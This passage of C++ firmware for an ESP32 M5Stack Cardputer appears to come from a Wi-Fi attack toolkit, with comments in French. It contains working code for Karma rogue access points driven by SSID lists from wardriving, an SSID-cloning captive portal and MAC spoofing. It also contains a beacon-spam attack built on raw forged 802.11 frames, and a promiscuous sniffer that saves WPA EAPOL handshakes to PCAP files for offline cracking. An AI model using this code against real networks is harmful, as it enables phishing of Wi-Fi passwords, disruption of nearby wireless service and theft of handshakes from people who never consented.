    return "0000-00-00 00:00:00";
  }
}


void createKarmaList(int maxIndex) {

  std::set<std::string> uniqueSSIDs;
  // Lire le contenu existant de KarmaList.txt et l'ajouter au set
  File karmaListRead = SD.open("/KarmaList.txt", FILE_READ);
  if (karmaListRead) {
    while (karmaListRead.available()) {
      String ssid = karmaListRead.readStringUntil('\n');
      ssid.trim();
      if (ssid.length() > 0) {
        uniqueSSIDs.insert(ssid.c_str());
      }
    }
    karmaListRead.close();
  }

  File file = SD.open("/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv", FILE_READ);
  if (!file) {
    Serial.println("Error opening scan file");
    return;
  } else {
    Serial.println("Scan file opened successfully");
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (isNetworkOpen(line)) {
      String ssid = extractSSID(line);
      uniqueSSIDs.insert(ssid.c_str());
    }
  }
  file.close();

  // Écrire le set dans KarmaList.txt
  File karmaListWrite = SD.open("/KarmaList.txt", FILE_WRITE);
  if (!karmaListWrite) {
    Serial.println("Error opening KarmaList.txt for writing");
    return;
  } else {
    Serial.println("KarmaList.txt opened for writing");
  }

  Serial.println("Writing to KarmaList.txt");
  for (const auto& ssid : uniqueSSIDs) {
    karmaListWrite.println(ssid.c_str());
    Serial.println("Writing SSID: " + String(ssid.c_str()));
  }
}

bool isNetworkOpen(const String & line) {
  int securityTypeStart = nthIndexOf(line, ',', 1) + 1;
  int securityTypeEnd = nthIndexOf(line, ',', 2);
  String securityType = line.substring(securityTypeStart, securityTypeEnd);
  return securityType.indexOf("[OPEN][ESS]") != -1;
}

String extractSSID(const String & line) {
  int ssidStart = nthIndexOf(line, ',', 0) + 1;
  int ssidEnd = nthIndexOf(line, ',', 1);
  String ssid = line.substring(ssidStart, ssidEnd);
  return ssid;
}

int nthIndexOf(const String & str, char toFind, int nth) {
  int found = 0;
  int index = -1;
  while (found <= nth && index < (int) str.length()) {
    index = str.indexOf(toFind, index + 1);
    if (index == -1) break;
    found++;
  }
  return index;
}

void karmaSpear() {
  isAutoKarmaActive = true;
  createCaptivePortal();
  File karmaListFile = SD.open("/KarmaList.txt", FILE_READ);
  if (!karmaListFile) {
    Serial.println("Error opening KarmaList.txt");
    waitAndReturnToMenu(" No KarmaFile.");
    return;
  }
  if (karmaListFile.available() == 0) {
    karmaListFile.close();
    Serial.println("KarmaFile empty.");
    waitAndReturnToMenu(" KarmaFile empty.");
    return;
  }
  while (karmaListFile.available()) {
    String ssid = karmaListFile.readStringUntil('\n');
    ssid.trim();

    if (ssid.length() > 0) {
      activateAPForAutoKarma(ssid.c_str());
      Serial.println("Created Karma AP for SSID: " + ssid);
      displayAPStatus(ssid.c_str(), millis(), autoKarmaAPDuration);
      if (karmaSuccess) {
        waitAndReturnToMenu("return to menu");
        return;
      }
      delay(200);
    }
  }
  karmaListFile.close();
  isAutoKarmaActive = false;
  Serial.println("Karma Spear Failed...");
  waitAndReturnToMenu("Karma Spear Failed...");
}



// beacon attack
std::vector<String> readCustomBeacons(const char* filename) {
    std::vector<String> customBeacons;
    File file = SD.open(filename, FILE_READ);

    if (!file) {
        Serial.println("Failed to open file for reading");
        return customBeacons;
    }

    while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();  // Enlever les espaces inutiles en fin de ligne

        if (line.startsWith("CustomBeacons=")) {
            String beaconsStr = line.substring(String("CustomBeacons=").length());

            while (beaconsStr.length() > 0) {
                int idx = beaconsStr.indexOf(',');
                if (idx == -1) {
                    customBeacons.push_back(beaconsStr);
                    break;
                } else {
                    customBeacons.push_back(beaconsStr.substring(0, idx));
                    beaconsStr = beaconsStr.substring(idx + 1);
                }
            }
            break;
        }
    }
    file.close();
    return customBeacons;
}

char randomName[32];
char *randomSSID() {
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = random(8, 33);  // Génère une longueur entre 8 et 32
    for (int i = 0; i < len; ++i) {
        randomName[i] = charset[random() % strlen(charset)];
    }
    randomName[len] = '\0';  // Terminer par un caractère nul
    return randomName;
}

char emptySSID[32];
uint8_t beaconPacket[109] = {
    0x80, 0x00, 0x00, 0x00,             // Type/Subtype: management beacon frame
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC address (modifié plus tard)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (modifié plus tard)
    0x00, 0x00,                                     // Fragment & sequence number (will be done by the SDK)
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    0xe8, 0x03,                                     // Interval: every 1s
    0x31, 0x00,                                     // Capabilities Information
    0x00, 0x20, // Tag: Set SSID length, Tag length: 32
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
    0x01, 0x08, // Tag: Supported Rates, Tag length: 8
    0x82,       // 1(B)
    0x84,       // 2(B)
    0x8b,       // 5.5(B)
    0x96,       // 11(B)
    0x24,       // 18
    0x30,       // 24
    0x48,       // 36
    0x6c,       // 54
    0x03, 0x01, // Channel set, length
    0x01,       // Current Channel
    0x30, 0x18,
    0x01, 0x00,
    0x00, 0x0f, 0xac, 0x04, // WPA2 with CCMP
    0x02, 0x00,
    0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    0x01, 0x00,
    0x00, 0x0f, 0xac, 0x02,
    0x00, 0x00
};

const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}; // Canaux Wi-Fi utilisés (1-11)
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;

void nextChannel() {
    if (sizeof(channels) / sizeof(channels[0]) > 1) {
        wifi_channel = channels[channelIndex];
        channelIndex = (channelIndex + 1) % (sizeof(channels) / sizeof(channels[0]));
        esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
    }
}

void generateRandomWiFiMac(uint8_t *mac) {
    mac[0] = 0x02; // Unicast, locally administered MAC address
    for (int i = 1; i < 6; i++) {  // Génère aléatoirement les 5 autres octets
        mac[i] = random(0, 255);
    }
}

void beaconSpamList(const char *list, size_t listSize) {
    int i = 0;
    uint8_t macAddr[6];

    Serial.println("Starting beaconSpamList...");

    if (listSize == 0) {
        Serial.println("Empty list provided. Exiting beaconSpamList.");
        return;
    }

    nextChannel();

    while (i < listSize) {
        int j = 0;
        while (list[i + j] != '\n' && j < 32 && i + j < listSize) {
            j++;
        }

        uint8_t ssidLen = j;

        if (ssidLen > 32) {
            Serial.println("SSID length exceeds limit. Skipping.");
            i += j;
            continue;
        }

        Serial.print("SSID: ");
        Serial.write(&list[i], ssidLen);
        Serial.println();

        generateRandomWiFiMac(macAddr);
        memcpy(&beaconPacket[10], macAddr, 6); // Source MAC address
        memcpy(&beaconPacket[16], macAddr, 6); // BSSID

        memset(&beaconPacket[38], 0, 32);
        memcpy(&beaconPacket[38], &list[i], ssidLen);

        beaconPacket[37] = ssidLen; // SSID length
        beaconPacket[82] = wifi_channel; // Wi-Fi channel

        for (int k = 0; k < 3; k++) {
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false);
            delay(1);
        }
        i += j;

        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
            break;
        }
    }

    Serial.println("Finished beaconSpamList.");
}

void beaconAttack() {
    WiFi.mode(WIFI_MODE_STA);

    bool useCustomBeacons = confirmPopup("Use custom beacons?");
    M5.Display.clear();

    std::vector<String> customBeacons;
    if (useCustomBeacons) {
        customBeacons = readCustomBeacons("/config/config.txt");
    }

    int beaconCount = 0;
    unsigned long previousMillis = 0;
    int delayTimeBeacon = 0;
    const int debounceDelay = 0;
    unsigned long lastDebounceTime = 0;

    M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
    M5.Display.setCursor(M5.Display.width() / 2 - 24, M5.Display.height() - 20);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.println("Stop");

    M5.Display.setCursor(10, 18);
    M5.Display.println("Beacon Spam running..");
    Serial.println("-------------------");
    Serial.println("Starting Beacon Spam");
    Serial.println("-------------------");

    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        unsigned long currentMillis = millis();
        if (currentMillis - previousMillis >= delayTimeBeacon) {
            previousMillis = currentMillis;

            if (useCustomBeacons && !customBeacons.empty()) {
                for (const auto& ssid : customBeacons) {
                    beaconSpamList(ssid.c_str(), ssid.length());
                }
            } else {
                char *randomSSIDName = randomSSID();
                beaconSpamList(randomSSIDName, strlen(randomSSIDName));
            }

            beaconCount++;
        }

        M5.update();
        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && currentMillis - lastDebounceTime > debounceDelay) {
            break;
        }
        delay(10);
    }
    Serial.println("-------------------");
    Serial.println("Stopping beacon Spam");
    Serial.println("-------------------");
    restoreOriginalWiFiSettings();
    waitAndReturnToMenu("Beacon Spam Stopped..");
}


// beacon attack end 


// Set wifi and password ssid

void setWifiSSID() {
  M5.Display.setTextSize(1.5); // Définissez la taille du texte pour l'affichage
  M5.Display.clear(); // Effacez l'écran avant de rafraîchir le texte
  M5.Display.setCursor(0, 10); // Positionnez le curseur pour le texte
  M5.Display.println("Enter SSID:"); // Entête ou instruction
  M5.Display.setCursor(0, 30); // Définissez la position pour afficher le SSID
  String nameSSID = ""; // Initialisez la chaîne de données pour stocker le SSID entré
  enterDebounce();
  while (true) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      if (M5Cardputer.Keyboard.isPressed()) {
        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

        // Ajout des caractères pressés à la chaîne de données
        for (auto i : status.word) {
          nameSSID += i;
        }

        // Suppression du dernier caractère si la touche 'del' est pressée
        if (status.del && nameSSID.length() > 0) {
          nameSSID.remove(nameSSID.length() - 1);
        }

        // Afficher le SSID courant sur l'écran
        M5.Display.clear(); // Effacez l'écran avant de rafraîchir le texte
        M5.Display.setCursor(0, 10); // Positionnez le curseur pour le texte
        M5.Display.println("Enter SSID:"); // Entête ou instruction
        M5.Display.setCursor(0, 30); // Définissez la position pour afficher le SSID
        M5.Display.println(nameSSID); // Affichez le SSID entré
        M5.Display.display(); // Mettez à jour l'affichage

        // Si la touche 'enter' est pressée, terminez la saisie et lancez la fonction de clonage
        if (status.enter) {
          if (nameSSID.length() != 0) {
            cloneSSIDForCaptivePortal(nameSSID);
            break; // Sortez de la boucle après la sélection
          } else {
            M5.Display.clear();
            M5.Display.setCursor(0, 10);
            M5.Display.println("SSID Error:");
            M5.Display.setCursor(0, 30);
            M5.Display.println("Must be superior to 0 and max 32");
            M5.Display.display();
            delay(2000); // Affiche le message pendant 2 secondes
            M5.Display.clear();
            M5.Display.setCursor(0, 10);
            M5.Display.println("Enter SSID:");
            M5.Display.setCursor(0, 30);
            M5.Display.println(nameSSID); // Affichez le mot de passe entré
          }
        }
      }
    }
  }
  waitAndReturnToMenu("Set Wifi SSID :" + nameSSID);
}




void setWifiPassword() {
  String newPassword = ""; // Initialisez la chaîne pour stocker le mot de passe entré
  M5.Display.setTextSize(1.5); // Définissez la taille du texte pour l'affichage
  // Attendre que la touche KEY_ENTER soit relâchée avant de continuer
  M5.Display.clear(); // Effacez l'écran avant de rafraîchir le texte
  M5.Display.setCursor(0, 10); // Positionnez le curseur pour le texte
  M5.Display.println("Enter Password:"); // Entête ou instruction
  M5.Display.setCursor(0, M5.Display.height() - 12); // Définissez la position pour afficher le SSID
  M5.Display.setTextSize(1); // Définissez la taille du texte pour l'affichage
  M5.Display.println("Should be greater than 8 or egal 0"); // Entête ou instruction
  M5.Display.setTextSize(1.5); // Définissez la taille du texte pour l'affichage
  enterDebounce();
  while (true) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      if (M5Cardputer.Keyboard.isPressed()) {
        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

        // Ajout des caractères pressés à la chaîne de données
        for (auto i : status.word) {
          newPassword += i;
        }

        // Suppression du dernier caractère si la touche 'del' est pressée
        if (status.del && newPassword.length() > 0) {
          newPassword.remove(newPassword.length() - 1);
        }

        // Afficher le mot de passe courant sur l'écran
        M5.Display.clear(); // Effacez l'écran avant de rafraîchir le texte
        M5.Display.setCursor(0, 10); // Positionnez le curseur pour le texte
        M5.Display.println("Enter Password:"); // Entête ou instruction
        M5.Display.setCursor(0, 30); // Définissez la position pour afficher le mot de passe
        M5.Display.println(newPassword); // Affichez le mot de passe entré
        M5.Display.display(); // Mettez à jour l'affichage

        // Si la touche 'enter' est pressée, terminez la saisie
        if (status.enter) {
          if (newPassword.length() >= 8 || newPassword.length() == 0) {
            captivePortalPassword = newPassword;
            break; // Sort de la boucle après la sélection
          } else {
            M5.Display.clear();
            M5.Display.setCursor(0, 10);
            M5.Display.println("Password Error:");
            M5.Display.setCursor(0, 30);
            M5.Display.println("Must be at least 8 characters");
            M5.Display.println("   Or 0 for Open Network");
            M5.Display.display();
            delay(2000); // Affiche le message pendant 2 secondes
            // Efface et redemande le mot de passe
            M5.Display.clear();
            M5.Display.setCursor(0, 10);
            M5.Display.println("Enter Password:");
            M5.Display.setCursor(0, 30);
            M5.Display.println(newPassword); // Affichez le mot de passe entré
          }
        }
      }
    }
  }
  waitAndReturnToMenu("Set Wifi Password :" + newPassword);
}

void setMacAddress() {
  String macAddress = ""; // Initialize the string to store the entered MAC address
  M5.Display.setTextSize(1.5); // Set the text size for display
  M5.Display.clear(); // Clear the screen before refreshing the text
  M5.Display.setCursor(0, 10); // Position the cursor for the text
  M5.Display.println("Enter MAC Address:"); // Header or instruction
  M5.Display.setCursor(0, M5.Display.height() - 12); // Position the cursor for instructions
  M5.Display.setTextSize(1); // Set the text size for the display
  M5.Display.println("Format: XX:XX:XX:XX:XX:XX"); // Instruction on the format
  M5.Display.setTextSize(1.5); // Set the text size back for the main input
  enterDebounce();
  
  while (true) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      if (M5Cardputer.Keyboard.isPressed()) {
        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

        // Add the pressed characters to the string
        for (auto i : status.word) {
          macAddress += i;
        }

        // Remove the last character if the 'del' key is pressed
        if (status.del && macAddress.length() > 0) {
          macAddress.remove(macAddress.length() - 1);
        }

        // Display the current MAC address on the screen
        M5.Display.clear(); // Clear the screen before refreshing the text
        M5.Display.setCursor(0, 10); // Position the cursor for the text
        M5.Display.println("Enter MAC Address:"); // Header or instruction
        M5.Display.setCursor(0, 30); // Position the cursor for the MAC address
        M5.Display.println(macAddress); // Display the entered MAC address
        M5.Display.display(); // Update the display

        // If the 'enter' key is pressed, finish the input
        if (status.enter) {
          if (isValidMacAddress(macAddress)) { // Validate the MAC address format
            setDeviceMacAddress(macAddress); // Set the MAC address for AP mode
            break; // Exit the loop after setting the MAC address
          } else {
            M5.Display.clear();
            M5.Display.setCursor(0, 10);
            M5.Display.println("MAC Address Error:");
            M5.Display.setCursor(0, 30);
            M5.Display.println("Invalid format. Use:");
            M5.Display.println("XX:XX:XX:XX:XX:XX");
            M5.Display.display();
            delay(2000); // Display the message for 2 seconds
            // Clear and ask for the MAC address again
            M5.Display.clear();
            M5.Display.setCursor(0, 10);
            M5.Display.println("Enter MAC Address:");
            M5.Display.setCursor(0, 30);
            M5.Display.println(macAddress); // Display the entered MAC address
          }
        }
      }
    }
  }
  waitAndReturnToMenu("Set MAC Address :" + macAddress);
}

// Helper function to validate MAC address format
bool isValidMacAddress(String mac) {
  // Check the length and format of the MAC address
  if (mac.length() == 17) {
    for (int i = 0; i < mac.length(); i++) {
      if (i % 3 == 2) {
        if (mac.charAt(i) != ':') return false;
      } else {
        if (!isHexadecimalDigit(mac.charAt(i))) return false;
      }
    }
    return true;
  }
  return false;
}

void setDeviceMacAddress(String mac) {
    // Convert the MAC address string to a byte array
    uint8_t macBytes[6];
    for (int i = 0; i < 6; i++) {
        macBytes[i] = (uint8_t) strtol(mac.substring(3 * i, 3 * i + 2).c_str(), NULL, 16);
    }

    // Ensure the MAC address is not locally administered
    macBytes[0] &= 0xFE;

    // Initialize WiFi in AP mode only
    WiFi.mode(WIFI_MODE_AP);

    // Disconnect WiFi before setting MAC
    esp_wifi_disconnect();  
    delay(100);

    // Set the MAC address for AP (Access Point) mode
    esp_err_t resultAP = esp_wifi_set_mac(WIFI_IF_AP, macBytes);

    // Check results for AP
    if (resultAP == ESP_OK) {
        Serial.println("MAC address for AP mode set successfully");
    } else {
        Serial.print("Failed to set MAC address for AP mode: ");
        Serial.println(esp_err_to_name(resultAP));
    }

    // Display results on the M5Stack screen
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    if (resultAP == ESP_OK) {
        M5.Display.println("MAC Address set for AP:");
        M5.Display.println(mac);
    } else {
        M5.Display.println("Error setting MAC Address");
    }
    M5.Display.display();

    // Start WiFi after setting MAC
    esp_wifi_start();  
}




// Set wifi and password ssid end







// sniff handshake/deauth/pwnagotchi

bool beacon = false;
std::set<String> registeredBeacons;
unsigned long lastTime = 0;  // Last time update
unsigned int packetCount = 0;  // Number of packets received

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  packetCount++;
  unsigned long currentTime = millis();
  if (currentTime - lastTime >= 1000) {
    if (packetCount < 100) {
      M5.Lcd.setCursor(M5.Display.width() - 72, 0);
    } else {
      M5.Lcd.setCursor(M5.Display.width() - 81, 0);
    }
    M5.Lcd.printf(" PPS:%d ", packetCount);

    lastTime = currentTime;
    packetCount = 0;
  }

  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
  const uint8_t *frame = pkt->payload;
  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);


  const uint8_t frameType = (frameControl & 0x0C) >> 2;
  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  if (estUnPaquetEAPOL(pkt)) {
    Serial.println("EAPOL Detected !!!!");

    const uint8_t *receiverAddr = frame + 4;
    const uint8_t *senderAddr = frame + 10;

    Serial.print("Address MAC destination: ");
    printAddress(receiverAddr);
    Serial.print("Address MAC expedition: ");
    printAddress(senderAddr);

    enregistrerDansFichierPCAP(pkt, false);
    nombreDeEAPOL++;
    M5.Lcd.setCursor(M5.Display.width() - 45, 14);
    M5.Lcd.printf("H:");
    M5.Lcd.print(nombreDeHandshakes);
    if (nombreDeEAPOL < 999) {
      M5.Lcd.setCursor(M5.Display.width() - 81, 28);
    } else {
      M5.Lcd.setCursor(M5.Display.width() - 90, 28);
    }
    M5.Lcd.printf("EAPOL:");
    M5.Lcd.print(nombreDeEAPOL);
  }

  if (frameType == 0x00 && frameSubType == 0x08) {
    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon

    // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);

    if (strcmp(macStr, "DE:AD:BE:EF:DE:AD") == 0) {
      Serial.println("-------------------");
      Serial.println("Pwnagotchi Detected !!!");
      Serial.print("CH: ");
      Serial.println(ctrl.channel);
      Serial.print("RSSI: ");
      Serial.println(ctrl.rssi);
      Serial.print("MAC: ");
      Serial.println(macStr);
      Serial.println("-------------------");

      String essid = ""; // Préparer la chaîne pour l'ESSID
      int essidMaxLength = 700; // longueur max
      for (int i = 0; i < essidMaxLength; i++) {
        if (frame[i + 38] == '\0') break; // Fin de l'ESSID

        if (isAscii(frame[i + 38])) {
          essid.concat((char)frame[i + 38]);
        }
      }

      int jsonStart = essid.indexOf('{');
      if (jsonStart != -1) {
        String cleanJson = essid.substring(jsonStart); // Nettoyer le JSON

        DynamicJsonDocument json(4096); // Augmenter la taille pour l'analyse
        DeserializationError error = deserializeJson(json, cleanJson);

        if (!error) {
          String name = json["name"].as<String>(); // Extraire le nom
          String pwndnb = json["pwnd_tot"].as<String>(); // Extraire le nombre de réseaux pwned
          Serial.println("Name: " + name); // Afficher le nom
          Serial.println("pwnd: " + pwndnb); // Afficher le nombre de réseaux pwned
          // affichage
          displayPwnagotchiDetails(name, pwndnb);
        } else {
          Serial.println("Could not parse Pwnagotchi json");
        }
      } else {
        Serial.println("JSON start not found in ESSID");
      }
    } else {
      pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
      enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet

    }
  }

  // Vérifier si c'est un paquet de désauthentification
  if (frameType == 0x00 && frameSubType == 0x0C) {
    // Extraire les adresses MAC
    const uint8_t *receiverAddr = frame + 4;  // Adresse 1
    const uint8_t *senderAddr = frame + 10;  // Adresse 2
    // Affichage sur le port série
    Serial.println("-------------------");
    Serial.println("Deauth Packet detected !!! :");
    Serial.print("CH: ");
    Serial.println(ctrl.channel);
    Serial.print("RSSI: ");
    Serial.println(ctrl.rssi);
    Serial.print("Sender: "); printAddress(senderAddr);
    Serial.print("Receiver: "); printAddress(receiverAddr);
    Serial.println();

    // Affichage sur l'écran
    M5.Lcd.setTextColor(WHITE, BLACK);
    M5.Lcd.setCursor(0, M5.Display.height() / 3 - 14);
    M5.Lcd.printf("Deauth Detected!");
    M5.Lcd.setCursor(0, M5.Display.height() / 3 );
    M5.Lcd.printf("CH: %d RSSI: %d  ", ctrl.channel, ctrl.rssi);
    M5.Lcd.setCursor(0, M5.Display.height() / 3 + 14);
    M5.Lcd.print("Send: "); printAddressLCD(senderAddr);
    M5.Lcd.setCursor(0, M5.Display.height() / 3 + 28);
    M5.Lcd.print("Receive: "); printAddressLCD(receiverAddr);
    nombreDeDeauth++;
    if (nombreDeDeauth < 999) {
      M5.Lcd.setCursor(M5.Display.width() - 90, 42);
    } else {
      M5.Lcd.setCursor(M5.Display.width() - 102, 42);
    }
    M5.Lcd.printf("DEAUTH:");
    M5.Lcd.print(nombreDeDeauth);

  }
  esp_task_wdt_reset();  // S'assurer que le watchdog est réinitialisé fréquemment
  vTaskDelay(pdMS_TO_TICKS(10));  // Pause pour éviter de surcharger le CPU
}

void displayPwnagotchiDetails(const String& name, const String& pwndnb) {
  // Construire le texte à afficher
  String displayText = "Pwnagotchi: " + name + "      \npwnd: " + pwndnb + "   ";

  // Préparer l'affichage
  M5.Lcd.setTextColor(WHITE, BLACK);
  M5.Lcd.setCursor(0, M5.Display.height() - 40);

  // Afficher les informations
  M5.Lcd.println(displayText);
}

void printAddress(const uint8_t* addr) {
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", addr[i]);
    if (i < 5) Serial.print(":");
  }
  Serial.println();
}

void printAddressLCD(const uint8_t* addr) {
  // Utiliser sprintf pour formater toute l'adresse MAC en une fois
  sprintf(macBuffer, "%02X:%02X:%02X:%02X:%02X:%02X",
          addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);

  // Afficher l'adresse MAC
  M5.Lcd.print(macBuffer);
}

unsigned long lastBtnBPressTime = 0;
const long debounceDelay = 200;

void deauthDetect() {
  bool btnBPressed = false;
  unsigned long lastKeyPressTime = 0;  // Temps de la dernière pression de touche
  const unsigned long debounceDelay = 300;  // Delai de debounce en millisecondes

  M5.Display.clear();
  M5.Lcd.setTextSize(1.5);
  M5.Lcd.setTextColor(WHITE, BLACK);

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);

  int x_btnA = 32;
  int x_btnB = 140;
  int y_btns = 122;

  M5.Lcd.setCursor(x_btnA, y_btns);
  M5.Lcd.println("Mode:m");

  M5.Lcd.setCursor(x_btnB, y_btns);
  M5.Lcd.println("Back:ok");

  if (!SD.exists("/handshakes") && !SD.mkdir("/handshakes")) {
    Serial.println("Fail to create /handshakes folder");
    return;
  }
  enterDebounce();
  while (!btnBPressed) {
    esp_task_wdt_reset();
    vTaskDelay(pdMS_TO_TICKS(10));
    M5.update();
    M5Cardputer.update();

    unsigned long currentPressTime = millis();
    bool keyPressedEnter = M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER);

    if (keyPressedEnter && currentPressTime - lastKeyPressTime > debounceDelay) {
      btnBPressed = true;
      lastKeyPressTime = currentPressTime;
    }

    if (M5Cardputer.Keyboard.isKeyPressed('m') && currentPressTime - lastKeyPressTime > debounceDelay) {
      autoChannelHop = !autoChannelHop;
      Serial.println(autoChannelHop ? "Auto Mode" : "Static Mode");
      lastKeyPressTime = currentPressTime;
    }

    if (!autoChannelHop) {
      if (M5Cardputer.Keyboard.isKeyPressed(',') && currentPressTime - lastKeyPressTime > debounceDelay) {
        currentChannelDeauth = currentChannelDeauth > 1 ? currentChannelDeauth - 1 : maxChannelScanning;
        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
        Serial.print("Static Channel : ");
        Serial.println(currentChannelDeauth);
        lastKeyPressTime = currentPressTime;
      }

      if (M5Cardputer.Keyboard.isKeyPressed('/') && currentPressTime - lastKeyPressTime > debounceDelay) {
        currentChannelDeauth = currentChannelDeauth < maxChannelScanning ? currentChannelDeauth + 1 : 1;
        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
        Serial.print("Static Channel : ");
        Serial.println(currentChannelDeauth);
        lastKeyPressTime = currentPressTime;
      }
    }

    if (autoChannelHop && currentPressTime - lastChannelHopTime > channelHopInterval) {
      currentChannelDeauth = (currentChannelDeauth % maxChannelScanning) + 1;
      esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
      Serial.print("Auto Channel : ");
      Serial.println(currentChannelDeauth);
      lastChannelHopTime = currentPressTime;
    }

    if (currentChannelDeauth != lastDisplayedChannelDeauth || autoChannelHop != lastDisplayedMode) {
      M5.Lcd.setCursor(0, 0);
      M5.Lcd.printf("Channel: %d    \n", currentChannelDeauth);
      lastDisplayedChannelDeauth = currentChannelDeauth;
    }

    if (autoChannelHop != lastDisplayedMode) {
      M5.Lcd.setCursor(0, 12);
      M5.Lcd.printf("Mode: %s  \n", autoChannelHop ? "Auto" : "Static");
      lastDisplayedMode = autoChannelHop;
    }

    delay(10);
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  delay(100); // Petite pause pour s'assurer que tout est terminé

  waitAndReturnToMenu("Stop detection...");
}


// sniff pcap
bool estUnPaquetEAPOL(const wifi_promiscuous_pkt_t* packet) {
  const uint8_t *payload = packet->payload;
  int len = packet->rx_ctrl.sig_len;

  // length check to ensure packet is large enough for EAPOL (minimum length)
  if (len < (24 + 8 + 4)) { // 24 bytes for the MAC header, 8 for LLC/SNAP, 4 for EAPOL minimum
    return false;
  }

  // check for LLC/SNAP header indicating EAPOL payload
  // LLC: AA-AA-03, SNAP: 00-00-00-88-8E for EAPOL
  if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 &&
      payload[27] == 0x00 && payload[28] == 0x00 && payload[29] == 0x00 &&
      payload[30] == 0x88 && payload[31] == 0x8E) {
    return true;
  }

  // handle QoS tagging which shifts the start of the LLC/SNAP headers by 2 bytes
  // check if the frame control field's subtype indicates a QoS data subtype (0x08)
  if ((payload[0] & 0x0F) == 0x08) {
    // Adjust for the QoS Control field and recheck for LLC/SNAP header
    if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 &&
        payload[29] == 0x00 && payload[30] == 0x00 && payload[31] == 0x00 &&
        payload[32] == 0x88 && payload[33] == 0x8E) {
      return true;
    }
  }

  return false;
}


// Définition de l'en-tête de fichier PCAP global
typedef struct pcap_hdr_s {
  uint32_t magic_number;   /* numéro magique */
  uint16_t version_major;  /* numéro de version majeur */
  uint16_t version_minor;  /* numéro de version mineur */
  int32_t  thiszone;       /* correction de l'heure locale */
  uint32_t sigfigs;        /* précision des timestamps */
  uint32_t snaplen;        /* taille max des paquets capturés, en octets */
  uint32_t network;        /* type de données de paquets */
} pcap_hdr_t;

// Définition de l'en-tête d'un paquet PCAP
typedef struct pcaprec_hdr_s {
  uint32_t ts_sec;         /* timestamp secondes */
  uint32_t ts_usec;        /* timestamp microsecondes */
  uint32_t incl_len;       /* nombre d'octets du paquet enregistrés dans le fichier */
  uint32_t orig_len;       /* longueur réelle du paquet */
} pcaprec_hdr_t;


void ecrireEntetePCAP(File &file) {
  pcap_hdr_t pcap_header;
  pcap_header.magic_number = 0xa1b2c3d4;
  pcap_header.version_major = 2;
  pcap_header.version_minor = 4;
  pcap_header.thiszone = 0;
  pcap_header.sigfigs = 0;
  pcap_header.snaplen = 65535;
  pcap_header.network = 105; // LINKTYPE_IEEE802_11

  file.write((const byte*)&pcap_header, sizeof(pcap_hdr_t));
  nombreDeHandshakes++;
}

